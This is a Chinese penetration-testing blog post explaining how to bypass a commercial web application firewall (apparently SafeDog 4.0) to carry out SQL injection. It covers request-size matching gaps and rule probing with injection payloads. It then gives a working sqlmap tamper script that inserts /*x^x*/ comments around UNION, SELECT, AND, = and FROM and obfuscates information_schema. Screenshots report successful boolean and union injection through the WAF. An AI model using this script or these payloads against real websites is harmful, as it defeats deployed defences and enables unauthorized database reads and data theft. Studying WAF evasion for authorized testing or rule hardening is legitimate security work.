<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>渗透测试中的Bypass技巧（三）自动化注入 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>07</span>
<span class=rest>Mar 2017</span></div></div><div class=matter><h1 class=title>渗透测试中的Bypass技巧（三）自动化注入</h1></div></div><h2 id=0x00-匹配资源大小限制>0x00 匹配资源大小限制</h2><p>某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。</p><p>Get方法提交的数据大小长度并没有限制，HTTP协议规范没有对URL长度进行限制。这个限制是特定的浏览器及服务器对它的限制。可见WAF可能在处理GET请求的时候，根据客户端（浏览器）规定的长度去匹配了，这就造成了一个缺陷。我们可以把有效数据放在这个限制的零界点，攻击语句放在零界点后方，让WAF以为这是一个正常请求，就随之放行，达到了攻击效果。</p><p>理论上讲，POST是没有大小限制的。HTTP协议规范也没有进行大小限制，起限制作用的是服务器的处理程序的处理能力。</p><p>例如在使用PHP进行POST提交时，文件大小受PHP配置文件PHP.INI限制，我们可以修改PHP.INI文件中的post_max_size参数，可将默认的2M字节，修改自己需要的大小，但由于HTTP协议的特性，这个值不宜设置过大，最大以8M为宜。假设如果服务器端设置了8M，而WAF默认只匹配2M，由此可见服务器端接受数据的大小>WAF匹配的数据最大大小。那么，我们可以根据上述方法，也可绕过WAF的拦截。</p><h2 id=0x01-绕过某waf上传>0x01 绕过某WAF上传</h2><p>渗透测试中的Bypass技巧（二） - 知乎专栏</p><p>在上一章中我们已经举例了一个bypass上传，最重要的彩蛋就在Bypass注入啦~</p><h2 id=0x02-绕过某waf注入>0x02 绕过某WAF注入</h2><p>我们构造一个SQL注入页面，慢慢去研究它的拦截规则：</p><p><img src=https://images.payloads.online/d6591cea-4f5e-11ec-9ece-00d861bf4abb.jpg alt="enter description here"></p><p>先从普通的语句开始做定位：</p><ul><li><p>and 1=1</p></li><li><p>and ‘s’=’s’</p></li><li><p>union select 1,2,3</p></li><li><p><code>union/**/select/**/user(),2,3</code></p></li><li><p>&mldr;&mldr;</p></li><li><p>等价替换</p></li><li><p>And ‘s’ like ‘s’</p></li></ul><p>此时我们已经可以使用like用于盲注（此时可以将所有的 = 替换成 Like ）</p><p><img src=https://images.payloads.online/d6a4edbe-4f5e-11ec-82b2-00d861bf4abb.jpg alt="enter description here"></p><h3 id=注释>注释</h3><p>我们可以设想出拦截的特征正则</p><p>union与select同时出现会被拦截，union[空格,%20,/*部分字符*/]select都会被拦截，目前普通的union select都会被拦截，既然空格,%20都会被匹配到，我们只能通过/**/内联来注释了（目前发现N多姿势，在这里只共享思路+一个bypass的tamper脚本）</p><ul><li><p><code>/**/</code></p></li><li><p><code>/*数字+字母*/</code></p></li><li><p><code>/*特殊符号+数字+字母*/</code></p></li><li><p>&mldr;..more</p></li></ul><p>假设union左右如果有select就拦截的话，那么定位union与select之间的敏感字符就好，假设union<code>[空格]</code>select，此时如果把空格替换成任意内联，就可bypass这个规则，此时规则也不可能是一条的。条件也是很多的。我们也只能讲内联这个规则做手脚了。</p><p>于是乎我发现<code>/*^xxx^xxx*/</code>字母加特殊字符即可bypass。</p><p>因为每个特征中都没有匹配到^与小写字母、大写字母、数字的组合，这些条件可以继续测试，笔者已经把此文写到最佳精简，测试期间也翻看过拦截日志，定位拦截特征。</p><p>（Union注入）例如在读取：mysql密码、表名的时候，我们还会查询information_schema数据库，这个可以转换大小写，或者在information_schema.TABLES直接再添加一个注释。下面就是测试过程：首先测试简单的and 1=1</p><p><img src=https://images.payloads.online/d6ea58ea-4f5e-11ec-924c-00d861bf4abb.jpg alt="enter description here"></p><p>然后我们使用注释bypass:</p><p><img src=https://images.payloads.online/d72ef748-4f5e-11ec-9570-00d861bf4abb.jpg alt="enter description here"></p><p>此时已经bypass成功了，我在这里用的是某dog 4.0（3.5也可以）</p><p><img src=https://images.payloads.online/d773335e-4f5e-11ec-ba40-00d861bf4abb.jpg alt="enter description here"></p><h2 id=0x03-自动化bypass注入>0x03 自动化bypass注入</h2><p>我们通过编写sqlmap的tamper用于bypass，主要是需要定位各种拦截点，使用sqlmap替换Payload。</p><p>首先在sqlmap的tamper文件夹里创建一个safedog.py，编写我们的tamper脚本</p><p><img src=https://images.payloads.online/d7beadfc-4f5e-11ec-8261-00d861bf4abb.jpg alt="enter description here"></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> lib.core.enums <span style=color:#f92672>import</span> PRIORITY
</span></span><span style=display:flex><span>__priority__ <span style=color:#f92672>=</span> PRIORITY<span style=color:#f92672>.</span>LOW
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>tamper</span>(payload):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> payload:
</span></span><span style=display:flex><span>		bypass_SafeDog_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/*x^x*/&#34;</span>
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;UNION&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;UNION&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;SELECT&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;SELECT&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;AND&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;AND&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;=&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;=&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34; &#34;</span>,bypass_SafeDog_str)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;information_schema.&#34;</span>,<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20/*!</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20INFOrMATION_SCHEMa</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20*/</span><span style=color:#e6db74>%20%</span><span style=color:#e6db74>20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/&#34;</span>)
</span></span><span style=display:flex><span>		payload<span style=color:#f92672>=</span>payload<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;FROM&#34;</span>,bypass_SafeDog_str<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;FROM&#34;</span><span style=color:#f92672>+</span>bypass_SafeDog_str)
</span></span><span style=display:flex><span>		<span style=color:#75715e>#print &#34;[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version .&#34;</span>
</span></span><span style=display:flex><span>		print payload
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> payload
</span></span></code></pre></td></tr></table></div></div><p>我们测试一下先不载入tamper脚本：</p><p><img src=https://images.payloads.online/d804cdf0-4f5e-11ec-9841-00d861bf4abb.jpg alt="enter description here"></p><p>到了这基本没戏了，我们看看拦截日志</p><p><img src=https://images.payloads.online/d858aa10-4f5e-11ec-890f-00d861bf4abb.jpg alt="enter description here"></p><p>现在载入tamper脚本：</p><p><img src=https://images.payloads.online/d8a9caee-4f5e-11ec-839d-00d861bf4abb.jpg alt="enter description here"></p><p>可以看到已经载入，并且识别了waf指纹。</p><p>以下是跑脚本的过程</p><p><img src=https://images.payloads.online/d90154bc-4f5e-11ec-a678-00d861bf4abb.jpg alt="enter description here"></p><p><img src=https://images.payloads.online/d94d48a4-4f5e-11ec-a123-00d861bf4abb.jpg alt="enter description here"></p><p>支持布尔值注入</p><p>支持union注入</p><p><img src=https://images.payloads.online/d99615f2-4f5e-11ec-b057-00d861bf4abb.jpg alt="enter description here"></p><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script></body></html>